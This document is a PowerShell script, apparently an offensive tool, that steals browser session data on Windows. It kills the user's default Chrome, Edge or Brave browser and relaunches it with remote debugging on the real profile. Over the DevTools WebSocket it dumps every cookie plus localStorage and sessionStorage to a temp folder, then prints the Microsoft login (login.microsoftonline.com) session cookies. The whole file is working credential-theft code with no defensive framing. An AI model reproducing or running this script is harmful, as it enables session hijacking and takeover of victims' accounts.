function Send-WsMsg {
	param (
		[System.Net.WebSockets.ClientWebSocket]$WebSocket,
		[string]$Message,
		[string]$OutputFile
	)

	$buffer = [System.Text.Encoding]::UTF8.GetBytes($Message)

	$sendTask = $WebSocket.SendAsync([System.ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
	$sendTask.Wait()

	$recvBuffer = New-Object byte[] 16384
	$fullResponse = [System.Text.StringBuilder]::new()

	do {
		$recvTask = $WebSocket.ReceiveAsync([System.ArraySegment[byte]]::new($recvBuffer), [System.Threading.CancellationToken]::None)
		$recvTask.Wait()
		$chunk = [System.Text.Encoding]::UTF8.GetString($recvBuffer, 0, $recvTask.Result.Count)
		$null = $fullResponse.Append($chunk)
	} while (-not $recvTask.Result.EndOfMessage)

	$response = $fullResponse.ToString()

	$response | Out-File -FilePath $OutputFile -Encoding UTF8

	return $response
}


function Get-DefaultBrowser {

	$regPath = "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice"
	$progId = (Get-ItemProperty -Path $regPath -Name "ProgId" -ErrorAction SilentlyContinue).ProgId
	Write-Output "[+] Registry ProgId hint: $progId"

	$browserMap = @{
		"ChromeHTML" = @{ Name = "chrome"; Path = "C:\Program Files\Google\Chrome\Application\chrome.exe"; ProfileDir = "$env:LocalAppData\Google\Chrome\User Data" }
		"MSEdgeHTM"  = @{ Name = "msedge"; Path = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"; ProfileDir = "$env:LocalAppData\Microsoft\Edge\User Data" }
		"BraveHTML"  = @{ Name = "brave"; Path = "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"; ProfileDir = "$env:LocalAppData\BraveSoftware\Brave-Browser\User Data" }
	}
	$browser = $browserMap[$progId]

	return $browser
}

$debugPort = 9481
$guid = [guid]::NewGuid()
$outputDir = "$env:TEMP\$guid"
if (-not (Test-Path $outputDir)) { New-Item -Path $outputDir -ItemType Directory | Out-Null }

$browser = Get-DefaultBrowser
if (-not $browser) { exit }

$browserName = $browser.Name
$browserPath = $browser.Path
$defaultProfileDir = $browser.ProfileDir

Write-Output "[+] Targeting default browser: $browserName at $browserPath"
Write-Output "[+] Default profile directory: $defaultProfileDir"

$browserProcess = Get-Process -Name $browserName -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "--remote-debugging-port=$debugPort" }
if ($browserProcess) {
	Write-Output "{+] $browserName already running with debugging on port $debugPort."
} else {
	$existingProcess = Get-Process -Name $browserName -ErrorAction SilentlyContinue
	if ($existingProcess) {
		Write-Output "[+] Killing existing $browserName instance (oops!)..."
		Stop-Process -Name $browserName -Force -ErrorAction SilentlyContinue
		Start-Sleep -Seconds 2
	}
	Write-Output "[+] Starting $browserName with default profile and debugging on port $debugPort..."
	Start-Process -FilePath $browserPath -ArgumentList "--remote-debugging-port=$debugPort" -NoNewWindow
	Start-Sleep -Seconds 5
}

if (-not (Test-NetConnection -ComputerName "127.0.0.1" -Port $debugPort -WarningAction SilentlyContinue).TcpTestSucceeded) {
	Write-Output "[!] Error: Debugging port $debugPort not responding."
	exit
}

try {
	$tabsResponse = Invoke-WebRequest -Uri "http://127.0.0.1:$debugPort/json" -UseBasicParsing
	$tabs = $tabsResponse.Content | ConvertFrom-Json
	Write-Output "[+] Found $($tabs.Count) tabs."
} catch {
	Write-Output "[!] Error fetching tabs: $_"
	exit
}

$targetTab = $tabs | Select-Object -First 1
$wsUrl = $targetTab.webSocketDebuggerUrl
Write-Output "[+] Connecting to tab: $($targetTab.url) via $wsUrl"


$ws = New-Object System.Net.WebSockets.ClientWebSocket
try {
	$connectTask = $ws.ConnectAsync([Uri]$wsUrl, [System.Threading.CancellationToken]::None)
	$connectTask.Wait()
	Write-Output "[+] WebSocket connected."
} catch {
	Write-Output "[!] WebSocket connection failed: $_"
	exit
}

Write-Output "[+] Dumping it all..."
$cookieCommand = @{ "id" = 1; "method" = "Network.getAllCookies" } | ConvertTo-Json
$cookieFile = "$outputDir\cookies.json"
Send-WsMsg -WebSocket $ws -Message $cookieCommand -OutputFile $cookieFile | Out-Null

$localStorageCommand = @{ "id" = 2; "method" = "Runtime.evaluate"; "params" = @{ "expression" = "JSON.stringify(localStorage)" } } | ConvertTo-Json
$localStorageFile = "$outputDir\local_storage.json"
Send-WsMsg -WebSocket $ws -Message $localStorageCommand -OutputFile $localStorageFile | Out-Null

$sessionStorageCommand = @{ "id" = 3; "method" = "Runtime.evaluate"; "params" = @{ "expression" = "JSON.stringify(sessionStorage)" } } | ConvertTo-Json
$sessionStorageFile = "$outputDir\session_storage.json"
Send-WsMsg -WebSocket $ws -Message $sessionStorageCommand -OutputFile $sessionStorageFile | Out-Null

# cleanup socket
$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", [System.Threading.CancellationToken]::None).Wait()
Write-Output "[+] WebSocket closed."


try {

	$targetDomain = ".login.microsoftonline.com"

	$cookiesData = Get-Content $cookieFile -Raw | ConvertFrom-Json
	$cookies = $cookiesData.result.cookies

	$matchingCookies = $cookies | Where-Object { $_.domain -eq $targetDomain }

	if ($matchingCookies) {
		Write-Host "[+] Found a $targetDomain token:" -ForegroundColor Green
		Write-Host "----------------"
		foreach ($cookie in $matchingCookies) {
			Write-Host "Name: $($cookie.name)"
			Write-Host "Value: $($cookie.value)"
		#	Write-Host "Domain: $($cookie.domain)"
		    Write-Host "----------------------------------"
		}
	} else {
		#Write-Host "[-] No cookies found for domain: $targetDomain" -ForegroundColor Red
	}
} catch {
	Write-Output "[-] Error parsing cookies from ${cookieFile}: $_"
}
Write-Output "[+] Total Cookies: $($cookiesData.result.cookies.Count)"

Write-Output "[+] Dumped files saved to $outputDir"
